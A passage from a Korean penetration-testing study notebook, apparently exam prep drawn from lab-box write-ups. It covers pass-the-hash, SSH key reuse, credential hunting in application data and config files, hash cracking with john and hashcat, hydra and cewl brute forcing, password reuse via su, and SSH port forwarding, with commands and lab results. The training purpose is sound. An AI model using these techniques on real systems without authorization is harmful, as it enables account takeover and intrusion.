**획득 후 — PtH.** NTLM 인증의 입력은 비밀번호가 아니라 NT 해시라 평문 없이 인증이 성립한다. `evil-winrm -u '<계정>$' -H '<NT해시>'`. `-H` 에는 NT 부분만 준다(`LM:NT` 전체 형식도 대부분의 도구가 받지만 evil-winrm 은 NT 만이 안전).
⚠️ **Kerberos 에는 PtH 가 통하지 않는다** — NT 해시를 RC4 키로 쓰는 Overpass-the-Hash(`impacket-getTGT -hashes :<NT>`)로 가야 한다.

### B-6. 자격증명·크래킹

#### B-61. 개인키의 주석은 소유자가 아니다

`user@host` 는 만든 사람이 붙인 라벨이고, 인증을 정하는 것은 **대상 계정의 `authorized_keys`** 임. 키를 주우면 **사용자 이름을 전부 돌릴 것**(`-o BatchMode=yes`).

([[Clue]] — `anthony@clue` 키로 로그인된 계정은 **root** 였음)

**개인키를 주웠을 때의 진단 순서 — 가장 싼 변수를 먼저 바꿀 것:**
1. `chmod 600 id_rsa` — 퍼미션이 느슨하면 ssh 가 아예 거부함(`UNPROTECTED PRIVATE KEY FILE!`)
2. `ssh-keygen -l -f id_rsa` — 파싱·비트수·주석 확인(**주석은 힌트이지 답이 아님**)
3. **사용자 이름을 전부 돌릴 것** ← 가장 싸고 가장 자주 맞음. `/etc/passwd` 의 셸 있는 계정 + `root`, `-o BatchMode=yes` 로 루프가 안 멈추게
4. 그래도 안 되면 `ssh -v` 로 **「거부되는지」**(`Offering public key` 후 거부) **「아예 안 받는지」**를 구분
5. **마지막에** 알고리즘 옵션(`-o PubkeyAcceptedKeyTypes=+ssh-rsa`)

[[Clue]] 는 두 가설을 세우고 **둘 다 틀렸음**(`~/.zsh_history` 1106~1131행):
```text
ssh -i ./id_rsa cassie@192.168.178.240
ssh -i ./id_rsa anthony@192.168.178.240
ssh -i ./id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa anthony@192.168.178.240
ssh -v -i ./id_rsa anthony@192.168.178.240
...
ssh -i id_rsa anthony@192.168.239.240
rm id_rsa
vi id_rsa
ssh -i ./id_rsa anthony@192.168.239.240
ssh-keygen -l -f id_rsa
ssh -i ./id_rsa root@192.168.239.240          ← 성공
```
- **가설1 「RSA/SHA-1 이 최신 OpenSSH 에서 거부된다」** — 합리적이었음(키는 2048비트 RSA 이고 최신 OpenSSH 는 `ssh-rsa` SHA-1 서명을 기본 비활성화함). **원인 아님.**
- **가설2 「복사하다 키가 깨졌다」** — `rm` 후 재붙여넣기, `ssh-keygen -l -f` 로 파싱 검증. 파싱은 정상이었음. **원인 아님.**
- **실제 원인은 사용자 이름** — 주석이 `anthony@clue` 라 anthony 로만 시도했는데 등록된 곳은 **root 의 `authorized_keys`** 였음.

⚠️ **`ssh -v` 를 친 것 자체는 좋은 수였으나 그 출력을 근거로 3번이 아니라 2번(파일 무결성 재확인)으로 돌아가 시간을 태웠음** — **가장 싼 변수를 마지막에 바꾼 것**이 이 시행착오의 패턴임.

#### B-62. 자격증명은 인증 DB 가 아니라 «애플리케이션 데이터» 에 있다

**헬프데스크·티켓·위키 시스템을 만나면 DB 를 통째로 grep 할 것.** `mysqldump` 후 `grep -i password`. **티켓·KB·followup·메모 본문에 평문 크레덴셜이 흔함.** bcrypt 해시를 붙잡고 rockyou 를 돌리기 전에 이것부터(A-22).

[[GLPI]] — `glpi_itilfollowups`(티켓 followup 본문)에 betty 의 평문 비번. **인증 DB(bcrypt)와 애플리케이션 데이터(평문)는 별개임.**

**같은 계열** — [[Wheels]] 의 「로그인 DB 는 bcrypt, 포털은 별개 XML 평문 저장소」(B-16) · [[Assignment]] 의 「타인의 노트 본문에 Gogs 관리자 자격증명 평문」(B-19).

**대상 앱** — GLPI · Zammad · osTicket · Redmine · Confluence 등 「사용자가 본문을 쓰는」 앱 전부.

**출처** — [[GLPI]] · [[Wheels]] · [[Assignment]].

#### B-63. sha512crypt 를 보고 접지 마라 — rockyou 완주에도 안 깨지면 그때 접는다

해시 알고리즘이 강해도 평문이 사전값이면 무의미함. [[Graph]] 는 둘 다 rockyou 한 방:

| 계정 | 평문 | rockyou 줄 번호 | 소요 |
|---|---|---|---|
| jane | `oakland` | 4,451 | 수 초 |
| root | `espartaco` | 70,985 | 36초 (1949 p/s) |

cost 1(iteration count) = 5000 이라도 앞쪽 사전값에는 방어가 되지 않음.

**반대로 rockyou 완주에도 안 깨지면 그 해시는 접을 것** — [[Graph]] 의 admin·josh 는 1차 john 이 rockyou 를 **끝까지 돌고(2시간 31분 54초, `Session completed`)** 도 안 나왔음. 그 시점이 「다른 저장소를 찾아라」의 신호임(A-22 · B-62).

⚠️ 병렬 job 은 `--session=<이름>` 필수(A-22).

#### B-64. Windows 설정 파일 자격증명 사냥 — 그리고 그 암호의 «주인»을 먼저 확정한다

**언제** — 토큰 특권·서비스 DACL·예약작업·`AlwaysInstallElevated`·SeriousSAM 이 전부 막혔을 때(A-41).

**어디를 뒤지나** — FileZilla · PuTTY · WinSCP · `unattend.xml` · `sysprep.inf` · PowerShell 히스토리 · `cmdkey /list`.
FileZilla 는 `%APPDATA%\FileZilla\recentservers.xml` · `sitemanager.xml`. 암호는 **base64**(암호화 아님):
```xml
<User>divine</User>
<Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
```
```bash
echo Q29udHJvbEZyZWFrMTE= | base64 -d
```

**⛔ 여기서 반사적으로 Administrator 재사용을 의심하고 달려들지 말 것.** 온-박스에서 로컬 SAM 에 대고 직접 물어보면 10초에 끝남:
```powershell
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Machine")
Write-Output ("--VALID-ADMIN=" + $ctx.ValidateCredentials("Administrator","<pw>"))
Write-Output ("--VALID-DIVINE=" + $ctx.ValidateCredentials("<user>","<pw>"))
```
[[Mice]] 결과는 `--VALID-ADMIN=False` / `--VALID-DIVINE=True` — **회수한 암호는 그 사용자 «자신의» Windows 암호였음.** 이걸 건너뛰었으면 freerdp 로 Administrator 를 계속 두드리며 시간을 태웠을 것.

**그럼 쓸모는?** 「Administrator 암호가 아니다」가 「쓸모없다」는 아님. [[Mice]] 는 그 사용자가 `Remote Desktop Users` 소속이라 **RDP 로 GUI 세션에 진입**하는 데 썼고, 그게 GUI LPE(B-45)의 전제였음. → **회수한 자격증명은 「어느 계정에」뿐 아니라 「어느 서비스에」 쓸 수 있는지도 같이 잴 것**(A-24).

**원격 대안** — 445 가 열려 있으면 `nxc smb <ip> -u <user> -p <pw> --local-auth`.

#### B-65. hydra·cewl 실무 함정 — `-c` 파일 형식과 `hydra.restore`

**⑴ `cewl -c` 로 만든 파일을 그대로 `-P` 에 넣지 말 것.** `-c`(빈도 포함)를 주면 파일이 **`Niffenegger, 4` 형식**(쉼표+숫자)이 되어 hydra 가 그 문자열 «전체»를 시험함 — **정답을 사전에 갖고도 못 맞힘.** 빈도는 `-c` 로 뽑아 눈으로 보고, **먹일 사전은 `-c` 없이 따로 만들 것.**
[[Fikklish]] 실측 — `hydra -L users.txt -P cewl.txt -t 4 ssh://<타겟>` 이 **1392 조합**을 돌았고 사전에 정답 `niffenegger` 가 들어 있었는데도 이 형식 문제로 못 맞혔음(웹 쪽 로그인이 먼저 뚫려 중단). 앞선 실행은 테마 단어 사전으로 **124 login tries, 0 valid password found**.

**⑵ `-f` 를 붙였다 뗀 자리에 `hydra.restore` 가 남으면 다음 실행이 「10초 안에 중단하라」며 10초를 대기함.** 자동화 안에서는 **`-I`(기존 restore 무시)** 를 붙여 그 대기를 없앨 것.

**⑶ 견적 문자열을 잘못 읽지 말 것** — `00:21h` 는 **21분**이지 21시간이 아님. 그래도 이건 손절 신호임: 4계정 × 348단어를 22번에 던지는 동안 **웹 쪽 힌트 하나 확인이 더 빨랐음**(B-1-17). 웹 폼 쪽은 레이트리밋 때문에 애초에 불가능한 계획이었음(A-2-12).

#### B-66. 해시 접두어로 포맷을 즉시 판별한다

`$` 로 시작하는 해시는 **`$id$salt$hash` 구조**이고 `id` 자리가 알고리즘임.

| 접두어 | 알고리즘 | john `--format` | hashcat `-m` |
|---|---|---|---|
| `$apr1$` | Apache MD5(APR1) | `md5crypt`(또는 `md5crypt-long`) | `1600` |
| `$1$` | md5crypt(전통 Unix) | `md5crypt` | `500` |
| `$5$` | SHA-256 crypt | `sha256crypt` | `7400` |
| `$6$` | SHA-512 crypt | `sha512crypt` | `1800` |
| `$2a$`·`$2b$`·`$2y$` | bcrypt | `bcrypt` | `3200` |
| `$y$` | yescrypt(최신 Debian·Ubuntu `/etc/shadow`) | — | — |
| 접두어 없는 32 hex | 원시 MD5 | `raw-md5` | `0` |

⚠️ **`--format` 을 안 주면 john 이 오판해 영영 안 깨짐.** `$apr1$` 은 특히 `md5crypt` 로 잡아야 하는데 자동 감지가 다른 후보를 먼저 고르는 경우가 있음. 헷갈리면 `john --list=formats | tr ',' '\n' | grep -i md5`.
⚠️ **`$y$`(yescrypt)는 john·hashcat 표준 빌드로 잘 안 깨짐** — 시험에서 보면 크랙에 시간 쓰지 말고 다른 경로로.

⚠️ **크랙 도구를 꺼내기 «전에» 그것이 해시가 맞는지부터 볼 것 — 인코딩일 수 있음.** `$` 접두어도 없고 길이가 4의 배수이며 `=` 로 끝나면 **base64 임**. `base64 -d` 한 줄로 평문이 나오므로 워드리스트도 시간도 불필요함.
[[PwnLab]] — DB `users` 테이블의 비밀번호가 base64 였고, 그 평문이 **OS 계정에 그대로 재사용**돼 `su` 로 옆걸음이 성립했음(A-24). **「해시처럼 보이는 문자열 = 크랙 대상」이라는 반사가 여기서 시간을 태움.**

**출처** — [[Muddy]](`passwd.dav` 의 `$apr1$` → `administrant:sleepless`, rockyou 로 1초) · [[PwnLab]](base64). 「rockyou 완주에도 안 깨지면 접는다」는 B-63, 해시 vs 가역 암호화 구분은 B-67.

**⑵ 접두어가 없으면 «길이»로 판정함.**

| 길이·형태 | 알고리즘 |
|---|---|
| 32 hex | MD5(또는 NTLM·LM — 자동판정이 흔들리는 지점, B-6-11) |
| 40 hex | SHA-1 |
| 64 hex | SHA-256 |
| `$2a$`·`$2b$`·`$2y$` | bcrypt |
| `$6$` | SHA-512-crypt |

**⑶ 해시를 «만들» 때는 `echo -n` 이나 `printf` 를 쓸 것.** `echo` 기본은 개행을 붙여 전혀 다른 값이 나옴. **심은 해시로 로그인이 안 되면 페이로드를 의심하기 전에 «개행»부터 의심할 것.** PowerShell 의 `[Text.Encoding]::UTF8.GetBytes()` 는 개행을 안 붙여 이 함정이 없음.
→ [[Butch]] 는 네 변형(대소문자 × 개행 유무)의 SHA-256 이 전부 달랐고, 그 대비로 **평문이 소문자 `butch` 에 개행 없음**이라는 것이 역으로 확정됐음.

**⑷ 덮어쓰기 난이도는 알고리즘이 정함** — 솔트 없는 SHA-256 이면 「아는 값의 해시」를 그냥 심으면 됨. bcrypt 면 솔트 포함 문자열을 통째로 넣어야 해 훨씬 어려움(B-12 의 `UPDATE` 경로).
⚠️ **자동 크랙 도구는 시험에서 허용됨**(E 절) — `hashcat -m 1400`(SHA-256) · `-m 0`(MD5). 다만 rockyou 전수는 GPU 없이 오래 걸리니 **5분 안에 안 깨지면 다른 경로로 넘어갈 것**(B-63).

**base64 는 «경유지»지 종착지가 아님 — 디코드 후 한 번 더 판정할 것.** 크리덴셜 파일을 얻었을 때의 30초 손절 루틴:
```bash
file <파일> && wc -c <파일> && strings -n 6 <파일> | head -20
grep -aoE '\$[0-9a-z]{1,6}\$[^:]{8,}' <파일>   # 알려진 해시 접두사
xxd <파일> | head -5                            # 매직 바이트 · 구조
```
판정은 셋으로 갈림 — ①알려진 해시 형식 → `hashid` 로 모드 확정 후 크랙 ②base64·hex 덩어리 → **디코드해서 ①이나 ③으로 재분류** ③구조 불명 blob → **즉시 손절**(제품 고유 포맷은 소스나 리버싱 없이는 못 풂. `john`·`hashcat` 에 넣을 모드 자체가 없음).

[[Hub]] — `user.dat`(467 B)이 80/tcp 로 그대로 받아짐. `file` → `JSON text data`(바이너리가 아님), 내용은 키 하나(`v`)에 base64 한 덩어리 → **디코드하니 `$1$`·`$5$`·`$6$`·`$2y$`·`$apr1$` 가 하나도 없는 불투명 blob** → 셋째로 귀결, 손절. **둘째에서 멈추고 hashcat 모드를 하나씩 돌려봤다면 시간을 통째로 날렸음.**

⚠️ **「크랙이 안 된다」와 「쓸모가 없다」는 다름.** 같은 파일이 두 가지로 쓰였음 — ①`user.dat` 이 80 으로 읽힌다는 사실 자체가 문서 루트 = `/var/www/html` = 제품 설치 디렉터리임을 확정 ②**이 경로의 파일이 웹으로 읽힌다 = 이 경로에 쓸 수 있으면 웹으로 회수된다** — 업로드 RCE(B-1-36)와 데이터 반출 양쪽의 전제임.


**AD 에서 얻는 해시 4종 → hashcat 모드.** `hashcat -hh` 실행 결과 원문:
```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -hh | grep -E "^\s+(5500|5600|13100|18200|19700|1000)\s"
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
   1000 | NTLM                                                       | Operating System
```

| 얻은 것 | 모드 | 언제 나오는가 |
|---|---|---|
| Responder / 강제 인증 결과 | `-m 5600` | [[Heist]]·[[Vault]] |
| AS-REP (`GetNPUsers`) | `-m 18200` | 계정에 `DONT_REQ_PREAUTH` 가 켜져 있을 때 |
| TGS-REP (`GetUserSPNs`, Kerberoasting) | `-m 13100`(RC4) / `-m 19700`(AES256) | 계정에 SPN 이 붙어 있을 때 |
| NT 해시 (secretsdump 등) | `-m 1000` | 이미 크랙할 필요 없이 PtH 로 씀 |

**왜 AS-REP·TGS-REP 이 크랙 가능한 물건을 뱉는가.**
- **AS-REP(`-m 18200`)** — 정상 Kerberos 는 AS-REQ 에 **사전인증(pre-authentication)** 을 요구한다. 클라이언트가 현재 시각을 자기 비밀번호 파생 키로 암호화해 보내야 KDC 가 AS-REP 을 준다. 비밀번호를 모르면 그 암호문을 못 만들어 KDC 는 아무것도 안 준다. 그런데 계정에 `DONT_REQ_PREAUTH` 가 켜져 있으면 KDC 가 **아무 검증 없이 AS-REP 을 발급**하고, 그 일부가 사용자 키로 암호화돼 있어 오프라인 크랙 대상이 된다. **비밀번호를 몰라도 인증 없이 받아낼 수 있다는 것이 핵심**이다
- **TGS-REP(`-m 13100`)** — 도메인 사용자면 누구나 임의 SPN 의 TGS 를 요청할 수 있고, 그 티켓 부분이 SPN 이 걸린 서비스 계정의 키로 암호화된다. 서비스 계정 비밀번호가 사람이 정한 문자열이면 크랙된다. **컴퓨터 계정(`…$`)과 gMSA 는 120자 랜덤이라 크랙 불가**

**⛔ NetNTLMv2 해시는 한 글자도 편집하지 말 것.** 사용자명·도메인·blob 이 전부 HMAC 입력이다. 줄바꿈이 끼거나 도메인을 NetBIOS 대신 FQDN 으로 바꿔 적으면 **정답 비밀번호를 넣어도 크랙이 실패한다.** Responder 출력의 `[HTTP] NTLMv2 Hash :` 뒤 한 줄 전체를 그대로 파일에 넣을 것.
필드 구조: `사용자명 : (LM 빈칸) : 도메인(NetBIOS) : 서버챌린지 : NTProofStr : blob`. 크랙 알고리즘은 `NTHash = MD4(UTF16LE(p))` → `NTLMv2Hash = HMAC-MD5(NTHash, UTF16LE(USER.upper()+DOMAIN))` → `HMAC-MD5(NTLMv2Hash, 챌린지‖blob)` 가 `NTProofStr` 과 같으면 정답.

**손절선 — 12초.** NetNTLMv2 는 반복(iteration)이 없는 HMAC-MD5 2회라 CPU 만으로도 초당 100만 건이 나온다([[Heist]] 실측 `1244.3 kH/s`, Ryzen 7 9800X3D). **rockyou 전체가 CPU 에서 12초다.** 12초 안에 안 나오면 규칙(`-r /usr/share/hashcat/rules/best64.rule`)을 붙이거나 크랙을 포기하고 다른 경로로 갈 것. **여기서 30분을 쓰는 것이 시험에서 가장 흔한 시간 낭비다.** ([[Heist]] 는 `Progress: 4096/14344385`, 2초에 끝났다)

#### B-67. 해시 vs 가역 암호화 — 시간 배분을 결정하는 구분

| | 해시(예: 사용자 로그인 비번) | **가역 암호화**(예: 데이터소스 저장 비번) |
|---|---|---|
| 방식 | 단방향(PBKDF2-SHA256+salt 등) | 대칭키 암호화(AES-256-CFB 등, 양방향) |
| 복원 | 사전 대입 = **확률 게임** | **키만 있으면 100% 결정적** |
| 필요한 것 | 워드리스트 + 시간 + 운 | **마스터 키 하나** |
| 실패 가능성 | 높음(강한 비밀번호면 영영 못 깸) | 0 |
| 시험에서 | 시간을 태우는 함정이 되기 쉬움 | **먼저 노려야 할 표적** |

**DB 를 덤프했으면 테이블을 훑으며 「이건 해시인가 암호문인가」를 먼저 분류할 것.**
**구분법** — 길이가 들쭉날쭉하고 base64 이며 앞부분에 랜덤 바이트가 붙어 있으면 **암호문**(salt·IV 가 포함되므로). **고정 길이 hex**(32/40/64자)면 해시임.

[[Fanatastic]] — `user` 테이블의 admin 해시를 크랙하는 것은 **절대 하지 말아야 할 일**이었음. 가역 암호문(`data_source.secure_json_data`)이 **바로 옆에** 있었고, 그 키는 설정 파일에 있었음. 같은 계열의 「인증 DB 가 아닌 데이터에서 찾아라」는 B-62.

#### B-68. salt · IV · ciphertext 연접 포맷 — 애플리케이션 자체 암호화의 사실상 표준

많은 제품이 대칭키 암호화 결과를 **`salt(고정길이) || IV(블록크기) || ciphertext`** 순서로 이어붙여 base64 인코딩함. **salt 와 IV 는 비밀이 아님** — 「같은 키로 같은 평문을 암호화해도 결과가 달라지게」 만드는 장치일 뿐이고, 알려져도 안전성이 안 떨어지며 복호화에 반드시 필요하므로 암호문과 함께 저장하는 것이 **정상 설계**임. 거의 모든 실제 포맷(`$5$`·`$2y$` 해시 문자열, Fernet, JWE)이 같은 방식임.

| 요소 | 역할 | 없으면 |
|---|---|---|
| salt | 마스터 키에서 실제 대칭키를 유도할 때의 입력. 레코드마다 다름 | 모든 레코드가 같은 키를 씀. **하나 깨지면 전부 깨짐** |
| PBKDF2(수만 회) | 짧은 사람용 문자열을 균일한 키로 늘리고 무차별 대입 비용을 올림 | 마스터 키를 그대로 쓰면 길이도 엔트로피도 안 맞음 |
| IV | 블록암호 스트림 모드의 초기 블록. 레코드마다 다름 | 같은 평문 → 같은 암호문. **값이 같은 두 레코드가 눈으로 식별됨** |
| CFB 등 스트림 모드 | 블록 암호를 패딩 없이 임의 길이로 씀 | ECB/CBC 면 패딩 필요, 평문 길이가 노출됨 |

**공격자 입장 — 암호문만 있으면 salt·IV 는 공짜로 얻음.** 부족한 것은 오직 마스터 키 하나이고, 그래서 **설정 파일에서 그 키를 읽는 순간 승부가 끝남**(B-69).

⚠️ **라이브러리 CFB 세그먼트 크기는 통일돼 있지 않음**(2026-08-26 Kali 실측 검증):
- pycryptodome `AES.new(key, AES.MODE_CFB, iv=iv)` 는 **기본 segment_size 가 8비트(CFB8)** 이고, Go `cipher.NewCFBDecrypter`(전체 블록 CFB)와 같은 출력을 내려면 **`segment_size=128` 을 명시**해야 함 — 두 출력이 실제로 다름을 실측 확인함(`ct1 != ct2`)
- 반면 Python `cryptography`(hazmat)의 `modes.CFB(iv)` 는 **segment_size 파라미터 자체가 없고 항상 풀블록**이라 이 문제가 애초에 발생하지 않음. **복호화 스크립트를 처음부터 짤 때는 `cryptography` 쪽이 이 함정을 원천 차단함**
- **검증법** — 평문이 출력 가능한 ASCII 로 끝까지 나오면 성공, **앞 한두 글자만 말이 되면 키가 아니라 모드 파라미터를 의심할 것**(pycryptodome 을 썼다면)

⚠️ **[[Fanatastic]] 은 이 함정을 실제로 겪지 «않았음»** — 그 박스의 `~/PG/Fanatastic/decrypt.py`(663B, 2026-08-20 08:38)는 pycryptodome 이 아니라 `cryptography`(hazmat)를 썼고, 그 라이브러리에는 `segment_size` 인자가 없음(Kali 에서 `inspect.signature` 로 확인). 원 노트가 이것을 「이 박스 최대의 함정」으로 적었던 것은 **반증됨.** 위 서술은 **일반 지식으로 참**이라 카드에 남기되 **박스 귀속으로 인용하지 말 것.**

#### B-69. 설정 파일에서 «주석 처리된» 항목 = 「그 값이 기본값」이라는 문서

배포용 설정 파일은 대개 **「주석 처리된 전체 옵션 목록 + 기본값」** 형태로 배포됨. 목적이 사용자에게 「무엇을 바꿀 수 있고 안 바꾸면 뭐가 되는지」를 보여주는 것이기 때문.

| 파일 상태 | 실제 적용값 | 공격자에게 주는 정보 |
|---|---|---|
| `;secret_key = SW2Ycw…`(주석) | **컴파일 기본값 = 그 값** | 키를 그대로 얻음 |
| `secret_key = Abc123…`(활성) | 그 값 | 키를 그대로 얻음 |
| 줄 자체가 없음 | 컴파일 기본값 | 제품 소스·문서에서 기본값을 찾아야 함 |

**세 경우 모두 키를 얻음. 주석이라고 버리는 순간만 못 얻음.**

**반사 명령 — `;`·`#` 로 시작하는 줄을 필터링해서 버리지 말 것:**
```bash
grep -nEi 'pass|secret|key|token|admin|user|url|host|db|smtp' <설정파일> | grep -v '^\s*$'
```

**오판 경로가 비쌈** — 「키가 설정 파일에 없다 → 환경변수나 다른 곳에 있겠지 → `/proc/self/environ`·systemd 유닛·도커 컴포즈를 뒤진다」로 시간이 대량 소모됨.
**확증법 — 추론으로 확신하지 말고 넣고 돌려볼 것.** [[Fanatastic]] 은 그 값으로 복호화를 돌려 평문이 `SuperSecureP@ssw0rd` 라는 **읽히는 문자열**로 나온 것이 사후 증명이었음.
→ 일반화: **검증 비용이 싼 가설은 논쟁하지 말고 즉시 실행으로 판정할 것.** 복호화 시도는 1초면 끝나고 결과가 읽히는 평문이면 그 자체가 증명임. 「이게 맞을까」를 30분 고민하는 것은 **순수한 손실**임.

**⑵ 주석이 «값»이 아니라 «경로»를 알려주는 판도 있음.** [[PlanetExpress]] `config/config.yml` 의 주석 처리된 플러그인 블록(`# Self developed plugin for PlanetExpress` / `#PicoTest:` / `#  enabled: true`)이 워드리스트에 없는 진입점 `/plugins/PicoTest.php` 를 그대로 지목했음 — **비활성이라고 파일이 없는 것이 아님.** 자세한 것은 A-16.

#### B-6-10. 사이트 콘텐츠 기반 자체 사전이 rockyou 를 이긴다

**⛔ 브루트포스 «전»에 서버 처리량을 실측할 것** — 병렬 `curl` N개 한 줄이면 됨. [[Monster]] 는 **70 req/s**(200요청/2.87초)였고, rockyou 1,434만 개는 이 속도로 **56시간**이라 계산상 불가능이었음. **시험이었으면 그 지점에서 접었어야 함.**

**대안 세트 — `cewl` → 룰 확장 → `hydra` 를 한 세트로 기억할 것:**
```bash
cewl -d 3 -m 4 -w words.txt http://<타겟>/
hashcat --stdout -r /usr/share/hashcat/rules/<룰>.rule words.txt | sort -u > words_x.txt
wc -l words_x.txt          # ← 이 한 줄을 빼먹지 말 것(A-1-19)
```
룰 확장이 붙이는 것 — 대소문자 변형·숫자 꼬리·리트 치환.

[[Monster]] — 정답 `wazowski` 는 **10k 상용 사전에 없고 사이트 제목에 그대로 있었음.** 14,579개 후보 중에서 나옴.
⚠️ `cewl -c`(빈도 포함)로 만든 파일을 그대로 `-P` 에 넣지 말 것(B-65 ⑴) · 룰 파일명은 배포판마다 다름(A-1-19) · 온라인 사전공격의 **흔적 규모를 자각할 것**(C-5).

#### B-6-11. 솔트 없는 MD5 덤프 — 초 단위에 풀리고, 사용자 짝은 «따로» 되살려야 한다

**판단 신호** — `user:32자hex` 형식의 유출 덤프. 솔트가 없으므로 같은 평문은 항상 같은 해시이고, **후보 단어 하나를 한 번 해싱해 전 계정과 대조**할 수 있음. 사전 단어당 비용이 계정 수와 무관함.
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
- **`--format` 을 명시할 것.** 32자 hex 는 raw-MD5·NTLM·LM 등과 모양이 같아 자동판정이 엉뚱한 형식을 고르거나 되물음(B-66)
- john 이 `Loaded N password hashes with **no different salts**` 라고 알려주는 것이 정확히 「솔트 없음」의 뜻임

**⚠️ `--show` 는 평문만 뱉고 사용자와 짝지어 주지 않음** — 해시만 담긴 파일을 넣었으면 사용자 자리가 `?` 로 남음(`?:mailcall`). 짝을 되살리려면 평문을 다시 해싱해 덤프와 대조할 것:
```python
import hashlib
m={hashlib.md5(p.encode()).hexdigest():p for p in plains}
for line in open('dump.txt'):
    u,h=line.strip().split(':'); u=u.split('@')[0]
    print(f'{u}:{m.get(h,"<UNCRACKED>")}')
```
→ 애초에 **`user:hash` 형식 그대로 john 에 주면** `--show` 가 짝을 유지해 줌. 해시만 잘라 넣었을 때만 이 재조합이 필요함.

**크랙 로그의 진위 검산법** — wordlist 모드의 출력 순서는 크랙 난이도가 아니라 **wordlist 안의 행 순서**임(파일을 위에서 아래로 훑으므로). 사후에 각 평문의 행번호를 뽑아 출력 순서와 비교하면 그 로그가 진짜인지 검산됨.
[[Fowsniff]] 실측 — `scoobydoo2` 17577 · `orlando12` 81318 · `apples01` 119135 · `skyler22` 166758 · `mailcall` 622357 · `07011972` 2424341 · `carp4ever` 9279098 · `bilbo101` 9627898 로 **john 출력 순서와 정확히 일치**함(2026-08-26 rockyou 재조회).

**출처** — [[Fowsniff]](9개 중 8개, 1초 미만). 크랙한 값을 어디에 쓰는지는 B-2-13.

#### B-6-12. 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다

**주운 값을 「DB 비밀번호」로 좁게 부르지 말 것.** [[Codo]] — `sites/default/config.php` 의 MySQL 비밀번호 `FatPanda123` 이 **시스템 root 비밀번호와 동일**했음. `su root` 한 줄로 root, 익스플로잇·컴파일·SUID 사냥 전부 불필요.

**왜 이렇게 흔한가 — 게으름이 아니라 구조임:**

| 원인 | 설명 |
|---|---|
| 설치 시점의 관리자가 한 사람 | 웹앱을 설치하는 사람이 곧 서버 root. 그 순간 머릿속의 비밀번호는 하나뿐 |
| DB 비밀번호는 「사람이 안 볼 값」이라는 착각 | 설정 파일에 박아두고 잊음. 그래서 강한 것 대신 기억하기 쉬운 것을 넣음 |
| 비밀번호 관리자 미사용 | 새로 만들면 적어둘 곳이 없음 → 쓰던 걸 재사용 |
| 자동화 스크립트 | Ansible·셸 스크립트 하나에 변수 하나(`$PASSWORD`)로 DB·OS·앱을 전부 설정 |
| 로테이션 부재 | 한 번 정하면 몇 년을 감. 재사용의 효과가 시간이 지나도 안 줄어듦 |

**전면 재사용 시험 — 대상 목록부터 만들 것:**
```bash
cat /etc/passwd | grep -E 'sh$' | cut -d: -f1     # 셸이 있는 계정만
ls /home                                          # 홈 디렉터리가 있는 계정
```

| 대상 | 명령 |
|---|---|
| root | `su root` ← **먼저.** 성공하면 나머지가 필요 없음 |
| 각 일반 계정 | `su <user>` |
| DB 사용자명과 같은 OS 계정 | `su <dbuser>` — 이름 일치는 강한 신호임([[Fanatastic]]) |
| SSH | `ssh <user>@<타겟>` |
| 웹 관리자 패널 | 같은 비밀번호로 다른 앱 로그인 |
| MySQL 안의 다른 계정 | `mysql -u <dbuser> -p'<pw>' -e "select * from mysql.user\G"` |

**시험 출제 빈도가 높음** — 자격증명 재사용은 SUID·커널 익스플로잇보다 흔함. 전형은 셋 중 하나임: ①웹앱 설정 파일의 DB 비밀번호 → OS 계정 ②백업·메모·`.bash_history` 의 비밀번호 → SSH 재사용 ③서비스 유닛·크론 스크립트에 박힌 평문 → `su`. **세 경우 모두 「찾는 것」이 기술이지 「익스플로잇」이 아님** — 점수를 가르는 것은 익스플로잇 실력이 아니라 열거 체크리스트의 완성도임(A-41).

⚠️ **한 서비스의 거부가 자격증명의 오류가 아님**(A-24). Ubuntu 기본값 `PermitRootLogin prohibit-password` 때문에 `ssh root@` 가 막혀도 `su root` 는 통함 — **로컬 셸이 있으면 `su` 가 SSH 보다 우선**임(A-3-10).

**같은 계열** — [[Robust]](Sticky Notes 평문 → Administrator) · [[Levram]](`app.service` 평문 root 비밀번호) · [[Crane]](`config.php` DB 자격증명) · [[Fanatastic]](DB 사용자명 = OS 계정명). 저장소 이원화 쪽은 B-62.

**출처** — [[Codo]].


**재사용 시험 순서 — `su -` 가 SSH 보다 먼저임:**
```text
① su -                     ← root부터. 성공하면 나머지가 필요 없다
② su <각 로컬 계정>         ← /etc/passwd 에서 UID>=1000 목록
③ ssh <계정>@localhost      ← 로컬 셸이 있으면 su가 우선이지만, 안정된 TTY가 필요하면 ssh
④ 다른 웹 패널 / DB / 서비스
```
SSH 는 `PermitRootLogin`·`AllowUsers` 에 막힐 수 있고 **그 거부를 「비밀번호 틀림」으로 오독하기 쉬움**(A-24). [[plum]] 은 `su -` 한 번에 root — 메일함 발견부터 root 까지 **51초**였음. 누적: [[Codo]] · [[Scarlet]] · [[Zipper]] · [[plum]].
⚠️ **`su` 가 아니라 `su -` 를 쓸 것.** `su root` 는 환경을 물려받아 `PATH` 가 www-data 것이고, `su -` 는 로그인 셸이라 `/root` 로 이동하고 `PATH`·`HOME`·프로필이 root 것으로 새로 섬 — 웹 계정 셸의 `HOME not set` 문제가 한 번에 정리됨.

### B-7. 피벗·터널링

#### B-71. 내부에만 열린 서비스는 SSH `-L` 로 끌어온다

**셸을 잡은 뒤 `ss -lntp` 에 보이는데 nmap 에는 안 보이는 포트 = 즉시 로컬 포워딩 대상**(A-1-17 · A-41).

```bash
ssh -L 127.0.0.1:10000:127.0.0.1:10000 <계정>@<타겟>
```
`-L <로컬바인드>:<원격이 보는 주소>:<원격포트>` — Kali 의 `127.0.0.1:10000` 으로 온 것을 SSH 세션 반대편이 자기 `127.0.0.1:10000` 으로 내보냄. 이후 모든 요청은 Kali 에서 `https://127.0.0.1:10000/` 로 침.

